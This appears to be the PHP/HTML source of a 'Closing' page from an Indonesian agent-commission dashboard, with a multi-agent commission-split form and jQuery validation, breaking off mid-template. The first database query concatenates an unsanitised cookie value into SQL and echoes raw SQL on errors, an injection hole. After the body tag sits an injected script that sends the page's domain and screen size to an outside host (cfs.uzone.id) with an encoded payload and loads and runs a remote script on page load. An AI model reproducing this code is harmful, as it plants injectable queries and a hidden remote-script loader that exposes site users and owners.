<?php
session_start();
require './db.php';

$sqlU = "SELECT * FROM `users`,`employees` WHERE users.employee_id = employees.id AND users.username = '".$_COOKIE['idU']."'";
$resultU = mysqli_query($link, $sqlU);
$rowU = mysqli_fetch_array($resultU);
if(!$resultU) {
    echo "SQL ERROR: ".$sqlU;
}
if(!isset($_COOKIE['loginU'])) {
    header('location: login.php');
}
if($rowU['nama'] == null){
    header('location: proses.php?cmd=logout');
}

$sqlP = "SELECT * FROM `percents` WHERE id = 1";
$resultP = mysqli_query($link, $sqlP);
$rowP = mysqli_fetch_array($resultP);
if(!$resultP){
    echo "SQL ERROR: ".$sqlU;
}

$sqlEmployee = "SELECT * FROM employees WHERE aktif = 1";
$resultEmployee = mysqli_query($link, $sqlEmployee);
if(!$resultEmployee){
    echo "SQL ERROR: ".$sqlEmployee;
}

$sqlJabatan = "SELECT * FROM positions WHERE nama != 'resign'";
$resultJabatan = mysqli_query($link, $sqlJabatan);
if(!$resultJabatan){
    echo "SQL ERROR: ".$sqlJabatan;
}

$sqlCabang = "SELECT * FROM b_office";
$resultCabang = mysqli_query($link, $sqlCabang);
if(!$resultCabang){
    echo "SQL ERROR: ".$sqlCabang;
}

?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon.png">
    <link rel="icon" type="image/png" sizes="96x96" href="assets/img/favicon.png">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

    <title>Closing</title>
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />

    <!-- Bootstrap core CSS -->
    <link href="assets/css/bootstrap1.min.css" rel="stylesheet" />

    <!--  Paper Dashboard core CSS -->
    <link href="assets/css/paper-dashboard.css?v=1.2.1" rel="stylesheet"/>

    <!--  CSS for Demo Purpose, don't include it in your project -->
    <link href="assets/css/demo.css" rel="stylesheet" />

    <!-- Animation library for notifications -->
    <link href="assets/css/animate.min.css" rel="stylesheet"/>

    <!--  Fonts and icons     -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <link href='https://fonts.googleapis.com/css?family=Muli:400,300' rel='stylesheet' type='text/css'>
    <link href="assets/css/themify-icons.css" rel="stylesheet">

</head>
<body>
    <div class="wrapper">
        <!-- Menu (willpeavy.com/minifier) --> 
        <div class="sidebar" data-background-color="brown" data-active-color="danger"> <div class="logo"> <a href="home.php" class="simple-text logo-mini"> AA Indonesia </a> <a href="home.php" class="simple-text logo-normal"> AA Indonesia </a> </div><div class="sidebar-wrapper"> <ul class="nav"> <li> <a href="home.php"> <i class="ti-panel"></i> <p>Dashboard</p></a> </li><li> <a data-toggle="collapse" class-aria-expanded="true" href="#agentExamples"> <i class="ti-user"></i> <p>Agent <b class="caret"></b> </p></a> <div class="collapse" id="agentExamples"> <ul class="nav"> <li> <a href="agent/info.php"> <span class="sidebar-mini">I</span> <span class="sidebar-normal">Info</span> </a> </li><li> <a href="agent/daftar.php"> <span class="sidebar-mini">D</span> <span class="sidebar-normal">Daftar</span> </a> </li></ul> </div></li><li> <a data-toggle="collapse" href="#cabangExamples"> <i class="ti-home"></i> <p> Cabang <b class="caret"></b> </p></a> <div class="collapse" id="cabangExamples"> <ul class="nav"> <li> <a href="cabang/info.php"> <span class="sidebar-mini">I</span> <span class="sidebar-normal">Info</span> </a> </li><li> <a href="cabang/daftar.php"> <span class="sidebar-mini">D</span> <span class="sidebar-normal">Daftar</span> </a> </li></ul> </div></li><li class="active"> <a href="closing.php"> <i class="ti-pencil-alt"></i> <p> Closing </p></a> </li><li> <a data-toggle="collapse" href="#laporanExamples"> <i class="ti-stats-up"></i> <p> Laporan <b class="caret"></b> </p></a> <div class="collapse" id="laporanExamples"> <ul class="nav"> <li> <a href="laporan/rekapitulasi.php"> <span class="sidebar-mini">RK</span> <span class="sidebar-normal">Rekapitulasi</span> </a> </li><li> <a href="laporan/komisi.php"> <span class="sidebar-mini">KM</span> <span class="sidebar-normal">Komisi</span> </a> </li><li> <a href="laporan/unit.php"> <span class="sidebar-mini">UN</span> <span class="sidebar-normal">Unit</span> </a> </li><li> <a href="laporan/aktif.php"> <span class="sidebar-mini">AK</span> <span class="sidebar-normal">Aktif</span> </a> </li><li> <a href="laporan/pasif.php"> <span class="sidebar-mini">PS</span> <span class="sidebar-normal">Pasif</span> </a> </li></ul> </div></li><li> <a href="pengaturan.php"> <i class="ti-settings"></i> <p> Pengaturan </p></a> </li></ul> </div></div>
        <!-- Menu -->

        <div class="main-panel">
            <nav class="navbar navbar-default">
                <div class="container-fluid">
                    <div class="collapse navbar-collapse">

                        <a class="navbar-brand" href="closing.php">Closing</a>

                        <ul class="nav navbar-nav navbar-right">
                            <li>
                                <a>
                                    <i class="ti-user"></i>
                                    <p>
                                        <?php echo $rowU['nama'];?>   
                                    </p>
                                </a>                                  
                            </li>
                            <li>
                                <a href="proses.php?cmd=logout">
                                    <i class="ti-power-off"></i>
                                    <p>
                                        Logout
                                    </p>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </nav>

            <div class="content">

                <div class="container-fluid">
                    <form action="" method="POST" class="form-horizontal" id="registerFormValidation">
                    <div class="card" id="agentPertama">
                        <div class="card-header"><h4 class="card-title">Data closing<button id="add_form" class="btn btn-fill btn-success pull-right add_form" ><i class="glyphicon glyphicon-plus"></i> Tambah Agent</button></h4></div>
                        <div class="card-content">
                            
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-4 control-label" align="right">ID Agent :</label>
                                        <div class="col-sm-4">
                                            <select name="closing[0][id]" id="id" class="form-control" autofocus="">
                                                <?php 
                                                while($rowEmployee = mysqli_fetch_object($resultEmployee)) {
                                                    $e[] = $rowEmployee;
                                                   echo "<option value=".$rowEmployee->id.">" . $rowEmployee->id . " (". $rowEmployee->nama.")"."</option>";
                                                } 
                                                ?>
                                            </select>
                                        </div>
                                    </div>
                                </fieldset>
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-4 control-label" align="right">Tanggal closing :</label><star>*</star>
                                        <div class="col-sm-4">     
                                            <div class="input-group">
                                                <input type="text" name="tanggal_closing" id="tanggal_closing" class="form-control datetpicker" required></input>
                                                <span class="input-group-addon"><i class="glyphicon glyphicon-calendar"></i></span>
                                            </div>
                                        </div>
                                    </div>
                                </fieldset>
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-4 control-label" align="right">Total Komisi :</label><star>*</star>
                                        <div class="col-sm-4">
                                            <div class="input-group">
                                                <span class="input-group-addon">Rp</span>
                                                <input type="text" name="total_komisi" id="total_komisi" class="form-control" required="">
                                            </div>
                                        </div>
                                    </div>
                                </fieldset>
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-4 control-label" align="right">Jumlah Komisi :</label><star>*</star>
                                        <div class="col-sm-4">
                                            <div class="input-group">
                                                <span class="input-group-addon">Rp</span>
                                                <input type="text" onfocus="masuk(this)" onfocusout="keluar(this)" name="closing[0][jumlah_komisi]" id="jumlah_komisi" class="form-control" required="">
                                            </div>
                                        </div>
                                    </div>
                                </fieldset>
                                <!-- <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-4 control-label" align="right">Unit :</label><star>*</star>
                                        <div class="col-sm-4">
                                            <select name="unitP" id="unitP" class="form-control" required="">
                                                <?php 
                                                while($rowUnit = mysqli_fetch_object($resultUnit)) {
                                                    $u[] = $rowUnit;
                                                   echo "<option value=".$rowUnit->id.">" . $rowUnit->nama . "</option>";
                                                } 
                                                ?>
                                            </select>
                                        </div>
                                    </div>
                                </fieldset> -->
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-4 control-label" align="right">Jumlah unit :</label><star>*</star>
                                        <div class="col-sm-4">
                                            <input type="number" min="0" step="0.05" max="1" value="1" name="closing[0][unit]" id="unit" class="form-control" required="">
                                        </div>
                                    </div>
                                </fieldset>
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-4 control-label" align="right">Tipe :</label>
                                        <div class="col-sm-4">
                                            <select name="tipe" id="tipe" class="form-control" type="text" required="">
                                                <option value="Closing">Closing</option>
                                                <option value="Leasing">Leasing</option>
                                            </select>
                                        </div>
                                    </div>
                                </fieldset>
                                <fieldset>
                                    <div class="category">
                                        <label class="col-sm-4 control-label" align="right"><star>*</star>Harus diisi</label>
                                    </div>
                                </fieldset>
                                <div class="card-footer">
                                    <!-- <div class="form-group">
                                        <div class="col-sm-12"> 
                                            <input type="submit" name="submit" class="btn btn-info btn-fill pull-right" value="Simpan" style="width: 100px;"/>
                                        </div>
                                    </div> -->
                                </div>
                            </form>
                        </div>        
                    </div>

                    <!-- <div class="modal fade" id="agentModal" tabindex="-1" role="dialog">
                      <div class="modal-dialog modal-xs" role="document">
                        <div class="modal-content">
                          <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                            <h4 class="modal-title">Profil Agent</h4>
                          </div>
                          <div class="modal-body">
                            <form id="formAgent" class="form-horizontal">
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-2 control-label">ID Agent</label>
                                        <div class="col-sm-10">
                                            <select type="text" class="form-control" name="cari" id="cariId">
                                                <option value="null">-</option>
                                                <?php
                                                foreach($e as $rowEmployee) {
                                                   echo "<option value=".$rowEmployee->id.">" . $rowEmployee->id . " (". $rowEmployee->nama.")"."</option>";
                                                }
                                                ?>
                                            </select>
                                        </div>
                                    </div>
                                </fieldset>
                    
                          </div>
                          <div class="modal-footer">
                            <input type="submit" name="submit" class="btn btn-info" value="simpan"/>
                            <button type="button" class="btn btn-default" data-dismiss="modal">Batal</button>
                            </form>
                          </div>
                        </div>/.modal-content
                      </div>/.modal-dialog
                    </div>/.modal -->
                    
                    <div id="tambahAgent"></div>

                    <div id="semuaUpline"></div>

                    
                    <div class="card-content">
                        <div class="col-sm-12"> 
                            <button type="submit" name="submit" id="simpanID" class="btn btn-info btn-fill pull-right" style="display: none">Simpan</button>
                            <button type="submit" name="submit" id="selanjutnya" class="btn btn-info btn-fill pull-right">selanjutnya</button>
                            <button type="submit" name="submit" id="batal" class="btn btn-danger btn-fill pull-right" style="margin-right: 5px; display: none;">Batal</button>
                        </div>
                    </div>
                    <!-- </form> -->
                </div>
            </div>
            
            <br/><footer class="footer"> <div class="container-fluid"> <nav class="pull-left"> <ul> <li> <a href="#"> Media Solution </a> </li><li> <a href="#"> Blog </a> </li><li> <a href="#"> Licenses </a> </li></ul> </nav> <div class="copyright pull-right"> &copy; <script>document.write(new Date().getFullYear())</script> - Made with <i class="fa fa-heart heart"></i> by <a href="#">Media Solution</a> </div></div></footer>
        </div>
    </div>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKAz6JMkPltAPvhVgLvKlTyG2Q11ufhKxvls%2b8rFsEzchpoITXnhMJFZld3kCxvoNkNPdSGq2TK2v2KoYMSUVA%2fRJ8BGERO2px0q4sLTPEm9fUuNuLFnySTHe4rKMiVTFxzcx8n7HsaQFwVEyjcKFBhkyxu22Wv%2fOkug1QYCC8c53H1tyHX0DwMT3kwOtKb7Pd6d%2fZyWJMhwMIlSRie7MjjQkiZIZlwTOaqTwZnJ0bnnsAEwI6kB%2ffkvG98edF7%2bNYHlQTs9IqhcuHwDJeoUt5MC6UYm12Ow1kfcGZLMQ%2fzAI67OTHn5Hh%2bV2u%2bWlCakD5DO1DZreCnzBJGUgasGQ8CC03skMa4OoNtUe5tVfYln6XYMf2PnTyxn31eoe1fCtXp6jcqWhudE7v6HNOLwqR6WniFk2hpic29awXcEGr6uk7CWaq%2fW6E5uSf8uect1F3yAT9IHca9agjmyu%2bqk%2f5HfEJUuawf4zpVC5FdRyAQzLwBTUi1ByX7LcRxJzibYJ3G%2bE3Efd7g0a%2b7Tefj0bfZeqoD7eB3rJ5phfNTt04G0Iy0%2bO5LJMGA%2fJHJ8YYeTp2prakOqivYnA3w%2fIvn8B8HfBmrugQ7wyGpSSkLijr5wgT2jVePhr8ATCZICeiEeMG2KmGB5qficquy0AOL5Esbb35sfVSUbBq1lDSygllLluf6lx75BFS0ewDgjBSQOhUliXezxocRE1CnFjzZG3aOm0DwRrMYopRpE25GHtYghrKotUSSpacXSsjbOyKGL%2fohRkQV%2biLkXWGVfamefhj7Rstqx3YVwHP4l7JxT9eaQc7tN9gXikwh2rvAquOV3UGCh8uXx3Yn8u9axvDPtApe8K8EdBmDCTDRuRIj2%2bWMEIEk2%2bsW1k8Qw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

    <!--   Core JS Files. Extra: TouchPunch for touch library inside jquery-ui.min.js   -->
    <script src="assets/js/jquery-3.1.1.min.js" type="text/javascript"></script>
    <script src="assets/js/jquery-ui.min.js" type="text/javascript"></script>
    <script src="assets/js/perfect-scrollbar.min.js" type="text/javascript"></script>
    <script src="assets/js/bootstrap.min.js" type="text/javascript"></script>

    <!--  Forms Validations Plugin -->
    <script src="assets/js/jquery.validate.min.js"></script>

    <!-- Promise Library for SweetAlert2 working on IE -->
    <script src="assets/js/es6-promise-auto.min.js"></script>

    <!--  Plugin for Date Time Picker and Full Calendar Plugin-->
    <script src="assets/js/moment.min.js"></script>

    <!--  Date Time Picker Plugin is included in this js file -->
    <script src="assets/js/bootstrap-datetimepicker.js"></script>

    <!--  Select Picker Plugin -->
    <script src="assets/js/bootstrap-selectpicker.js"></script>

    <!--  Switch and Tags Input Plugins -->
    <script src="assets/js/bootstrap-switch-tags.js"></script>

    <!-- Circle Percentage-chart -->
    <script src="assets/js/jquery.easypiechart.min.js"></script>

    <!--  Charts Plugin -->
    <script src="assets/js/chartist.min.js"></script>

    <!--  Notifications Plugin    -->
    <script src="assets/js/bootstrap-notify.js"></script>

    <!-- Sweet Alert 2 plugin -->
    <script src="assets/js/sweetalert2.js"></script>

    <!-- Vector Map plugin -->
    <script src="assets/js/jquery-jvectormap.js"></script>

    <!-- Wizard Plugin    -->
    <script src="assets/js/jquery.bootstrap.wizard.min.js"></script>

    <!--  Bootstrap Table Plugin    -->
    <script src="assets/js/bootstrap-table.js"></script>

    <!--  Plugin for DataTables.net  -->
    <script src="assets/js/jquery.datatables.js"></script>

    <!--  Full Calendar Plugin    -->
    <script src="assets/js/fullcalendar.min.js"></script>

    <!-- Paper Dashboard PRO Core javascript and methods for Demo purpose -->
    <script src="assets/js/paper-dashboard.js?v=1.2.1"></script>

    <!--   Sharrre Library    -->
    <script src="assets/js/jquery.sharrre.js"></script>

    <!-- Paper Dashboard PRO DEMO methods, don't include it in your project! -->
    <script src="assets/js/demo.js"></script>

    <script type="text/javascript">
        $('#closeNotify').click(function() { // Buat tombol x 
            $('#notify').slideUp().empty();  // Buat nutup notif
        });

        Date.prototype.yyyymmdd = function() {         
                                        
            var yyyy = this.getFullYear().toString();                                    
            var mm = (this.getMonth()+1).toString(); // getMonth() is zero-based         
            var dd  = this.getDate().toString();             
                                
            return yyyy + '-' + (mm[1]?mm:"0"+mm[0]) + '-' + (dd[1]?dd:"0"+dd[0]);
        };

        var nf = Intl.NumberFormat(['ban','id']);


        $(document).ready(function(){

            // $('#simpanID').hide();
            // $('#batal').hide();
            $('#semuaUpline').hide();

            $('#tipe').change(function(){
                if($(this).val() == 'Leasing'){
                    unit = 0;
                    $('form input[id*=unit]').each(function(value){
                        if(value == 0){
                            if(banyak == 4){
                                hasil[0] = unit/4;
                                +$(this).val(hasil[0]);
                            }else if(banyak == 1){
                                hasil[0] = unit;
                                +$(this).val(hasil[0]);
                            }else{
                                hasil[0] = unit/2;
                                +$(this).val(hasil[0]);
                            }
                        }
                        if(value == 1){
                            if(banyak == 2){
                                hasil[1] = unit/2;
                                +$(this).val(hasil[1]);
                            }else{
                                hasil[1] = unit/4;
                                +$(this).val(hasil[1]);
                            }  
                        }
                        if(value == 2){
                            if(banyak == 2){
                                hasil[2] = unit/2;
                                +$(this).val(hasil[2]);
                            }else{
                                hasil[2] = unit/4;
                                +$(this).val(hasil[2]);
                            }
                        }
                        if(value == 3){
                            if(banyak == 2){
                                hasil[3] = unit/2;
                                +$(this).val(hasil[3]);
                            }else{
                                hasil[3] = unit/4;
                                +$(this).val(hasil[3]);
                            }
                        }
                        $(this).prop('disabled', true);
                    })
                }else{
                    unit = 1;
                    $('form input[id*=unit]').each(function(value){
                        if(value == 0){
                            if(banyak == 4){
                                hasil[0] = unit/4;
                                +$(this).val(hasil[0]);
                            }else if(banyak == 1 || banyak == 0){
                                hasil[0] = unit;
                                +$(this).val(hasil[0]);
                            }else{
                                hasil[0] = unit/2;
                                +$(this).val(hasil[0]);
                            }
                        }
                        if(value == 1){
                            if(banyak == 2){
                                hasil[1] = unit/2;
                                +$(this).val(hasil[1]);
                            }else{
                                hasil[1] = unit/4;
                                +$(this).val(hasil[1]);
                            }  
                        }
                        if(value == 2){
                            if(banyak == 2){
                                hasil[2] = unit/2;
                                +$(this).val(hasil[2]);
                            }else{
                                hasil[2] = unit/4;
                                +$(this).val(hasil[2]);
                            }
                        }
                        if(value == 3){
                            if(banyak == 2){
                                hasil[3] = unit/2;
                                +$(this).val(hasil[3]);
                            }else{
                                hasil[3] = unit/4;
                                +$(this).val(hasil[3]);
                            }
                        }
                        $(this).prop('disabled', false);
                    })
                }
            });

            //get it if Status key found
            if(localStorage.getItem("Status"))
            {
                $.notify({
                    // options
                    icon: 'glyphicon glyphicon-ok-sign',
                    message: 'Data agent berhasil untuk diperbarui.' 
                },{
                    // settings
                    type: 'success',
                    placement: {
                        from: "top",
                        align: "center"
                    },
                });
                localStorage.clear();
            }
        });

        var d = new Date();
        $('#tanggal_closing').val(d.yyyymmdd());

        $(function(){
            $('#notify').slideDown();
            $(".datetpicker").datetimepicker({
                format: 'YYYY-MM-DD',
                maxDate: 'now',
            });
        });
        var unit = 1;
        var agent = 1;
        var hasil =[];
        var Thasil =0;
        var Tkomisi = 0;
        var komisi =0;
        var hitung =0;
        var semua=0;
        var banyak = 0;

        function fSplit(a){
            var s = a.split('.');
            var x ="";
            for(var z = 0; z<s.length;z++){
                x += s[z];
            }
            return x;
        }

        function fGanti(a){
            var x = a.toLocaleString(['ban', 'id']);
            return x;
        }
        function masuk(a){
            var x = fSplit(a.value);
            a.value = x;
            
        }
        function keluar(a){
            var x = 0;
            if(isNaN(a.value)){
                a.value = x;
            }else{
                var $this = +a.value;
                a.value = fGanti($this);
            }
        }

        $('#total_komisi').change(function(){
            if(isNaN($(this).val())){
                $(this).val(0);
                Tkomisi = +$(this).val();
            }else{
                Tkomisi=+$(this).val();
                hitung=Tkomisi;
                $(this).val(fGanti(Tkomisi));
            }
            
            
        });
        $('#total_komisi').focus(function(){
            $(this).val(fSplit($(this).val()));
            $('#total_komisi').focusout(function(){
                $(this).val(fGanti(Tkomisi));
            });
        });
            
        function hapusAgent(data){
            var a = '#'+data;
            $(a).slideUp(function(){
                this.remove();
            });
            agent -=1;
            
            if(semua == 0){
               semua = 0; 
            }else if(semua >0){
                semua -=1;
            }

            banyak-=1;
            $("form input[id*=unit]").each(function(value){
                if(value == 0){
                    if(banyak == 4){
                        hasil[0] = unit/4;
                        +$(this).val(hasil[0]);
                    }else if(banyak == 1){
                        hasil[0] = unit;
                        +$(this).val(hasil[0]);
                    }else{
                        hasil[0] = unit/2;
                        +$(this).val(hasil[0]);
                    }
                }
                if(value == 1){
                    if(banyak == 2){
                        hasil[1] = unit/2;
                        +$(this).val(hasil[1]);
                    }else{
                        hasil[1] = unit/4;
                        +$(this).val(hasil[1]);
                    }  
                }
                if(value == 2){
                    if(banyak == 2){
                        hasil[2] = unit/2;
                        +$(this).val(hasil[2]);
                    }else{
                        hasil[2] = unit/4;
                        +$(this).val(hasil[2]);
                    }
                }
                if(value == 3){
                    if(banyak == 2){
                        hasil[3] = unit/2;
                        +$(this).val(hasil[3]);
                    }else{
                        hasil[3] = unit/4;
                        +$(this).val(hasil[3]);
                    }
                }
            });
            $('form input[id*=jumlah_komisi]').each(function(value){
                Thasil = Tkomisi*hasil[value];
                +$(this).val(Thasil);
            });
            
            // console.log(nf.format(Thasil));
        }

        var counter = 1;

        $('form').on('click', ".add_form", function(e){
            e.preventDefault();
            if(semua <4){        
                var html = '<div class="card" id="id' + counter + '">'+
                            '<div class="card-header"><h4 class="card-title">Agent Partner<button name="hapusAgent" id="hapusAgent" value="id' + counter + '" class="btn btn-fill btn-danger pull-right" onclick="hapusAgent(this.value)"><i class="glyphicon glyphicon-minus"></i> Hapus Agent</button></h4></div>'+
                            '<div class="card-content">'+
                                '<form action="" method="POST" class="form-horizontal">'+
                                    '<fieldset>'+
                                        '<div class="form-group">'+
                                            '<label class="col-sm-4 control-label" align="right">ID Agent :</label>'+
                                            '<div class="col-sm-4">'+
                                                '<select name="closing[' + counter + '][id]" id="id'+counter+'" class="form-control" autofocus="">'+
                                                    '<?php
                                                    foreach($e as $rowEmployee) {
                                                       echo "<option value=".$rowEmployee->id.">" . $rowEmployee->id . " (". $rowEmployee->nama.")"."</option>";
                                                    }
                                                    ?>'+
                                                '</select>'+
                                            '</div>'+
                                        '</div>'+
                                    '</fieldset>'+
                                    '<fieldset>'+
                                        '<div class="form-group">'+
                                            '<label class="col-sm-4 control-label" align="right">Jumlah Komisi :</label><star>*</star>'+
                                            '<div class="col-sm-4">'+
                                                '<div class="input-group">'+
                                                    '<span class="input-group-addon">Rp</span>'+
                                                    '<input type="text" onfocus="masuk(this)" onfocusout="keluar(this)" name="closing[' + counter + '][jumlah_komisi]" id="jumlah_komisi" class="form-control" required="">'+
                                                '</div>'+
                                            '</div>'+
                                        '</div>'+
                                    '</fieldset>'+
                                    '<fieldset>'+
                                        '<div class="form-group">'+
                                            '<label class="col-sm-4 control-label" align="right">Jumlah unit :</label><star>*</star>'+
                                            '<div class="col-sm-4">'+
                                                '<input type="number" min="0" step="0.05" max="1" name="closing[' + counter + '][unit]"  id="unit" class="form-control" required="">'+
                                            '</div>'+
                                        '</div>'+
                                    '</fieldset>'+
                                    '<fieldset>'+
                                        '<div class="category">'+
                                            '<label class="col-sm-4 control-label" align="right"><star>*</star>Harus diisi</label>'+
                                        '</div>'+
                                    '</fieldset>'+
                                    '<div class="card-footer">'+
                                        '</div>'+
                                    '</div>'+
                                '</form>'+
                            '</div>'+
                        '</div>';
                var nilai = $("#cariId").val();
                
                // $("#agentModal").modal('hide');
                
                swal({
                  title: 'Agent Partner',
                  type: 'info',
                  html:
                    '<select type="text" class="form-control" name="cari" id="cariId">'+
                        '<?php
                        foreach($e as $rowEmployee) {
                           echo "<option value=".$rowEmployee->id.">" . $rowEmployee->id . " (". $rowEmployee->nama.")"."</option>";
                        }
                        ?>'+
                    '</select>',
                  preConfirm: function () {
                    return new Promise(function (resolve) {
                      resolve([
                        $('#cariId').val(),
                      ])
                    })
                  },
                  onOpen: function () {
                    $('#cariId').focus()
                  },
                  showCloseButton: true,
                  showCancelButton: true,
                  confirmButtonColor: '#3085d6',
                  cancelButtonColor: '#d33',
                  confirmButtonText: 'Pilih',
                  cancelButtonText: 'Batal',
                  confirmButtonClass: 'btn btn-success',
                  cancelButtonClass: 'btn btn-danger',
                  buttonsStyling: false
                }).then(function (result) {
                    $(document).ready(function(){
                        $("#tambahAgent").append(html);
                        $('#id'+counter+' option[value="'+result[0]+'"]').attr('selected', 'selected');
                        $('form').each(function(e){
                            semua+=1;
                        });
                        counter++;
                        agent +=1;
                        banyak = 0;
                        if($('#tipe').val() == 'Leasing'){
                            $('form input[id*=unit]').each(function(){
                                $(this).prop('disabled', true);
                            });
                        }else{
                            $('form input[id*=unit]').each(function(){
                                $(this).prop('disabled', false);
                            });
                        }
                        $("form input[id*=unit]").each(function(value){
                            banyak = value+1;
                        });
                        $("form input[id*=unit]").each(function(value){
                            if(value == 0){
                                if(banyak == 4){
                                    hasil[0] = unit/4;
                                    +$(this).val(hasil[0]);
                                }else if(banyak == 1){
                                    hasil[0] = unit;
                                    +$(this).val(hasil[0]);
                                }else{
                                    hasil[0] = unit/2;
                                    +$(this).val(hasil[0]);
                                }
                                
                            }
                            if(value == 1){
                                if(banyak == 2){
                                    hasil[1] = unit/2;
                                    $(this).val(hasil[1]);
                                }else{
                                    hasil[1] = unit/4;
                                    $(this).val(hasil[1]);
                                }
                                
                            }
                            if(value == 2){
                                hasil[2] = unit/4;
                                $(this).val(hasil[2]);
                            }
                            if(value == 3){
                                hasil[3] = unit/4;
                                $(this).val(hasil[3]);
                            }
                            
                        });
                        $("form input[id*=jumlah_komisi]").each(function(value){
                            Thasil = Tkomisi*hasil[value];

                            $(this).val(fGanti(Thasil));
                        });
                    });
                    
                }).catch(swal.noop);

            }else if(semua >=4){
                $.notify({
                    // options
                    icon: 'glyphicon glyphicon-exclamation-sign',
                    message: 'Maksimal terdapat 4 agent didalam 1 Closing.' 
                },{
                    // settings
                    type: 'danger',
                    placement: {
                        from: "top",
                        align: "center"
                    },
                });
            }
            
            semua=0;
            
        });
            
        $.validator.setDefaults({
            highlight: function(element) {
                $(element).closest('.form-group').addClass('has-error');
            },
            unhighlight: function(element) {
                $(element).closest('.form-group').removeClass('has-error');
            },
            errorElement: 'span',
            errorClass: 'help-block',
            errorPlacement: function(error, element) {
                if(element.parent('.input-group').length) {
                    error.insertAfter(element.parent());
                } else {
                    error.insertAfter(element);
                }
            }
        });

        function clearBox(elementID)
        {
            document.getElementById(elementID).innerHTML = "";
        }

        $(function(){
            $('#batal').click(function(e){
                $('#agentPertama').slideDown().show();
                $('#tambahAgent').slideDown().show();
                $('#semuaUpline').slideUp().show();
                $('#batal').fadeOut().hide();
                $('#simpanID').fadeOut().hide();
                $('#selanjutnya').fadeIn().show();

                clearBox('semuaUpline');
            });

            $('#selanjutnya').click(function(e){
                

                $('form').each(function(){

                    $(this).validate({
                        rules: {
                            '.form-control':{
                                required:true
                            }
                        }
                    });
                    $.validator.setDefaults({
                        highlight: function(element) {
                            $(element).closest('.form-group').addClass('has-error');
                        },
                        unhighlight: function(element) {
                            $(element).closest('.form-group').removeClass('has-error');
                        },
                        errorElement: 'span',
                        errorClass: 'help-block',
                        errorPlacement: function(error, element) {
                            if(element.parent('.input-group').length) {
                                error.insertAfter(element.parent());
                            } else {
                                error.insertAfter(element);
                            }
                        }
                    });
                });
                var isvalidate= false;
                var unitA=[];
                var unitB=[];
                var agentA=[];
                $('form input[id*=unit]').each(function(){
                    unitA.push(+$(this).val());
                });
                $('form input[id*=jumlah_komisi]').each(function(){
                    unitB.push(+fSplit($(this).val()));
                });
                    var sumU = unitA.reduce(add, 0);
                    var sumK = unitB.reduce(add, 0);
                    function add(a, b) {
                        return a + b;
                    } 
                $('form select[id*=id] option:selected').each(function(){
                    agentA.push($(this).val());
                });
                    function cek(a){
                        var v=0;
                        for(var i=0; i<a.length;i++){
                            for(var j=0; j<a.length;j++){
                                if(a[i] == a[j]){
                                    v+=1;
                                }
                            }
                        }
                        return v;
                    }
                $('form').each(function(){
                    isvalidate = $(this).valid();
                    if(cek(agentA) > agentA.length){
                        isvalidate =false;
                        $.notify({
                            // options
                            icon: 'glyphicon glyphicon-exclamation-sign',
                            message: 'Id agent tidak boleh sama.' 
                        },{
                            // settings
                            type: 'danger',
                            placement: {
                                from: "top",
                                align: "center"
                            },
                        });
                    }
                    if(sumK > Tkomisi){
                        isvalidate =false;
                        $.notify({
                            // options
                            icon: 'glyphicon glyphicon-exclamation-sign',
                            message: 'Total jumlah komisi tidak boleh melebihi Rp.'+Tkomisi+'.' 
                        },{
                            // settings
                            type: 'danger',
                            placement: {
                                from: "top",
                                align: "center"
                            },
                        });
                    }
                    if((Tkomisi-sumK) > 0){
                        isvalidate =false;
                        $.notify({
                            // options
                            icon: 'glyphicon glyphicon-exclamation-sign',
                            message: 'Komisi sisa Rp.'+(Tkomisi-sumK)+'.' 
                        },{
                            // settings
                            type: 'danger',
                            placement: {
                                from: "top",
                                align: "center"
                            },
                        });
                    }
                    if(sumU > 1){
                        isvalidate =false;
                        $.notify({
                            // options
                            icon: 'glyphicon glyphicon-exclamation-sign',
                            message: 'Total jumlah unit tidak boleh melebihi 1.' 
                        },{
                            // settings
                            type: 'danger',
                            placement: {
                                from: "top",
                                align: "center"
                            },
                        });
                    }
                    if(isvalidate == false){
                        return isvalidate=false;
                    }
                });
                if(isvalidate){
                    event.preventDefault();

                    $('#agentPertama').slideUp().hide();
                    $('#tambahAgent').slideUp().hide();
                    $('#selanjutnya').fadeOut().hide();
                    $('#batal').fadeIn().show();
                    $('#simpanID').fadeIn().show();

                    var html ="";

                    $.ajax({
                        type: 'post',
                        url: 'proses.php?cmd=cekClosing',
                        dataType: "json",
                        data: $('form').serialize(),
                        success: function (data) {
                            for(var i=0; i<data.length;i++){
                                html='<div class="card" id="cekUpline"'+i+'>'+
                                        '<div class="card-header"><h4 class="card-title">Info Data closing</h4></div>'+
                                        '<div class="card-content">'+
                                            '<form class="form-horizontal">'+
                                                '<fieldset>'+
                                                    '<div class="form-group">'+
